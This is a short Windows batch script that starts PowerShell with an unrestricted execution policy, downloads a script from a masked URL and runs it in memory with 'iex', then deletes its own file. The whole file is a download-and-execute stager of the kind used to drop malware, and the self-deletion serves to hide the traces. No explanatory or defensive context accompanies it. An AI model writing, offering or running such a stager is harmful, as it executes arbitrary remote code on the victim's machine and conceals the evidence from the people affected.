@echo off
	PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "iex(New-Object Net.WebClient).DownloadString('***')"
	pause
DEL "%~f0"